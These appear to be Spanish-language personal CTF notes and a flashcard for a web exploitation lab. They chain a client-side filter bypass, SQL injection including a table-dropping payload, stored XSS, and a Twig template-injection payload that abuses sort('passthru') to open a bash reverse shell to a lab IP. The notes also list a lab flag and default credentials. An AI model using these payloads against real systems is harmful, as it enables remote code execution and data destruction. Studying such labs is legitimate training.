THM{INJECTICS_ADMIN_PANEL_007}

superadmin@injectics.thm
superSecurePasswd101

dev@injectics.thm
devPasswd123

la tabla la rompi con 1; drop table users;

https://www.revshells.com/

entramos con twig, con passthru

revisar, para entrar por el formulario de profile
https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=ssti#ssti-in-go


termino con este payload
{{ ["bash -c 'exec bash -i >& /dev/tcp/10.10.239.163/4445 0>&1'", ""] | sort('passthru') }}

y estabilizamos con python 
python3 -c 'import pty; pty.spawn("/bin/bash")'



**FLASHCARD — Cadena completa del laboratorio (inyecciones, bypass, Twig, RCE)**

**1. Validación en cliente (login JS)**

* Filtro básico en JavaScript: bloquea `or`, `and`, `select`, comillas, etc.
* Bypass directo con Burp: interceptás y enviás cualquier payload.
* Conclusión: **validación cliente = irrelevante**.

**2. Login vulnerable (functions.php)**

* Envío POST manual con parámetros `username`, `password`.
* Inyección SQL no visible.
* Confirmación: el backend absorbía errores y devolvía `"Invalid email or password"` siempre.

**3. Descubrimiento de adminLogin007.php**

* Segundo endpoint más simple: `mail`, `pass`.
* Payload crítico:
  `admin'`
* Se logró romper consulta y verificar comportamiento anómalo.

**4. Borrado de tabla y reinicialización**

* Payload clásico:
  `1; DROP TABLE users;`
* El sistema regeneraba tabla con credenciales por defecto.
* Esto confirmó ejecución de SQL inyectado.

**5. Acceso al panel y al formulario profile**

* Campo “nombre” se imprime en plantilla Twig.
* Primera prueba: `"><h1>TEST</h1>`
* Confirmación: **XSS almacenado** por impresión sin escapar.

**6. Intentos de SSTI en Twig**

* Bloqueado:

  * `filter('system')`
  * `sort('system')`
  * `dump(app)`
  * `file_excerpt`
  * `import`
  * filtros dinámicos
* Conclusión parcial: sandbox rígido pero con brechas.

**7. Identificación del vector real**

* `_self` imprime plantilla.
* `_self.env` existe pero restringido.
* `sort()` sí está disponible.
* El sandbox permite callables en `sort()`.
* Se requiere array de 2 elementos.

**8. RCE final vía Twig**
Payload funcional:

```twig
{{ ["bash -c 'exec bash -i >& /dev/tcp/10.10.239.163/4445 0>&1'", ""] | sort('passthru') }}
```

* Mecanismo interno: `sort()` llama a `passthru()` como callback.
* Resultado: **RCE completa, reverse shell**.

**9. Estabilización de shell**

* Uso de `pty.spawn("/bin/bash")`.
* Ajustes de terminal.

---

**Conclusión técnica:**
Ruta de explotación clara:
validación cliente → bypass → SQLi destructiva → regeneración → panel → SSTI parcial → autoescape deshabilitado → XSS confirmado → evaluación de sandbox → brecha en `sort()` con callables → ejecución de comandos → reverse shell.
